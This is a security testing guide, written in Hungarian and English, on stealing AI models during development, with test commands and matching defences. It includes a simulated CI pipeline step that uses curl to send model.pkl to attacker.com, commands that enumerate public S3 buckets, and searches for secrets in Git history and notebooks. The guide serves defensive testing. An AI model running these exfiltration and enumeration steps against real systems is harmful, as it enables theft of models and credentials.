# AITG-INF-06 - Dev-Time Model Theft Tesztelés

## Mi ez és miért fontos?

A **dev-time model theft** azt jelenti, hogy a támadó **ellopja a model-t a development phase során** - training közben vagy után, deployment előtt.

**Attack vectors:**
- **Hardcoded credentials:** Secrets in Git → S3 bucket access
- **CI/CD exfiltration:** Modified pipeline sends model to attacker
- **Unsecured APIs:** Internal model APIs publicly exposed

**Miért veszélyes?**
- **IP theft:** Proprietary model stolen
- **Competitive loss:** Months/years of R&D leaked
- **Financial damage:** Model worth millions

**OWASP Kategória:** LLM04:2025 Data/Model Poisoning (IP theft aspect)

---

## Gyakorlati Payloadok

### 1. Hardcoded Credentials Scan

**Cél:** Secrets in Git repo grant model storage access?

**Tools:**
```bash
# TruffleHog scan
trufflehog git file://. --only-verified

# Gitleaks scan
gitleaks detect --source . --verbose
```

**Sebezhető eredmény:**
```
Finding: AWS S3 Access Key
Secret: AKIAIOSFODNN7EXAMPLE
File: config/aws.py
Line: 15

Finding: Model Storage URL
Secret: https://s3.amazonaws.com/company-models/gpt-custom.pkl?AWSAccessKeyId=...
File: train.py
```
→ **CRITICAL:** Hardcoded credentials → model theft possible!

---

### 2. CI/CD Pipeline Modification Test

**Cél:** Developer can modify pipeline to exfiltrate model?

**Attack simulation:**
```yaml
# Modified .gitlab-ci.yml
train:
  script:
    - python train.py
    - echo "Model trained successfully"
    
    # MALICIOUS: Exfiltrate model
    - curl -X POST https://attacker.com/upload -F "file=@model.pkl"
```

**Sebezhető behavior:**
- Pipeline runs without security review
- No egress filtering (external curl allowed)
- Model exfiltrated

**Helyes behavior:**
- Pipeline changes require approval
- Egress firewall blocks attacker.com
- Alert triggered

---

### 3. Unsecured Model API Access

**Cél:** Internal model APIs publicly accessible?

**Payload:**
```bash
# Attempt to access internal model API
curl https://internal-model-api.company.com/models/gpt-custom/download

# Or try common paths
curl https://company.com/api/internal/models/download?model_id=123
```

**Sebezhető behavior:**
```
HTTP/1.1 200 OK
Content-Type: application/octet-stream

[Binary model data...]
```
→ **CRITICAL:** Model downloadable without auth!

**Helyes behavior:**
```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer
```

---

### 4. S3 Bucket Enumeration (Model Storage)

**Payload:**
```bash
# Try common model storage bucket names
aws s3 ls s3://company-models --no-sign-request
aws s3 ls s3://company-ai-training --no-sign-request
aws s3 ls s3://ml-artifacts --no-sign-request
```

**Sebezhető eredmény:**
```
2024-01-30 10:00:00  5368709120 gpt-custom-v2.pkl
2024-01-30 10:00:00  1932735283 bert-finetuned.h5
```
→ **CRITICAL:** Model files publicly listable/downloadable!

---

### 5. CI/CD Secrets Exposure

**Payload:**
```bash
# Check CI/CD logs for exposed secrets
curl https://gitlab.company.com/project/ci/jobs/12345/raw

# Or GitHub Actions logs
curl https://github.com/company/repo/actions/runs/12345/logs
```

**Sebezhető log content:**
```
+ export AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/
+ aws s3 cp model.pkl s3://company-models/
Model uploaded successfully
```
→ **CRITICAL:** Secrets in logs + model storage location revealed!

---

### 6. Git History Secret Search

**Payload:**
```bash
# Search entire Git history for secrets
git log -p -S "AWS_SECRET" --all

# Or check deleted files
git log --diff-filter=D --summary | grep model.pkl
```

**Sebezhető history:**
```
commit abc123...
Author: developer@company.com
Date: 2023-12-15

- AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/"
+ AWS_SECRET_KEY = os.getenv("AWS_SECRET_KEY")
```
→ **WARNING:** Secret was in Git history (even if removed now)!

---

### 7. Jupyter Notebook Credential Leak

**Payload:**
```bash
# Check for credentials in notebooks
grep -r "api_key\|password\|secret" *.ipynb

# Or scan all notebooks
find . -name "*.ipynb" -exec grep -l "AKIA" {} \;
```

**Sebezhető notebook:**
```python
# Cell 3
api_key = "sk-proj-abc123xyz789"  # ← HARDCODED!
model = download_model(api_key)
```

---

### 8. Model Artifact Signing Verification

**Cél:** Model artifacts signed-e? Integrity verifiable?

**Check signature:**
```bash
# Verify model signature
cosign verify --key cosign.pub s3://company-models/gpt-custom.pkl
```

**Sebezhető eredmény:**
```
Error: no signatures found
```
→ **WARNING:** Model not signed, integrity unverifiable!

**Helyes eredmény:**
```
Verification successful
Signed by: ml-team@company.com
Timestamp: 2024-01-30T10:00:00Z
```

---

## Védekezési Javaslatok

### 1. Secret Management

**Never hardcode:**
```python
# BAD
aws_key = "AKIAIOSFODNN7EXAMPLE"

# GOOD
aws_key = os.getenv("AWS_SECRET_KEY")
```

**Use secret vault:**
- HashiCorp Vault
- AWS Secrets Manager
- Azure Key Vault

---

### 2. CI/CD Pipeline Security

**Branch protection:**
```yaml
# Require approval for pipeline changes
- name: Security Review
  if: changes('.gitlab-ci.yml')
  approval: required
  reviewers: @security-team
```

**Egress filtering:**
```yaml
# Allow only approved domains
network_policy:
  egress:
    - pypi.org
    - github.com
  deny_all_others: true
```

---

### 3. Artifact Signing

**Sign all models:**
```bash
# After training
cosign sign --key cosign.key model.pkl

# Before deployment
cosign verify --key cosign.pub model.pkl || exit 1
```

---

### 4. Access Control (Model Storage)

**S3 bucket policy:**
```json
{
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::company-models/*",
  "Condition": {
    "StringNotEquals": {
      "aws:PrincipalOrgID": "o-yourorgid"
    }
  }
}
```

---

### 5. Audit Logging

**Log all model access:**
```python
log.info({
    "action": "model_download",
    "user": user.id,
    "model": "gpt-custom.pkl",
    "source_ip": request.remote_addr,
    "timestamp": datetime.now()
})
```

**Monitor for anomalies:**
- Multiple download attempts
- Access from unknown IPs
- Large data transfers

---

## Hasznos Toolok

- **TruffleHog, Gitleaks** - Secret scanning
- **Cosign** - Artifact signing
- **JFrog Artifactory** - Secure artifact storage
- **Google Cloud DLP** - Data loss prevention

---

## Referenciák

- OWASP AI Exchange - Model Theft - [https://genai.owasp.org/llmrisk/llm042025-data-and-model-poisoning/](https://genai.owasp.org/llmrisk/llm042025-data-and-model-poisoning/)
- MITRE ATT&CK T1074 - [https://attack.mitre.org/techniques/T1074/](https://attack.mitre.org/techniques/T1074/)
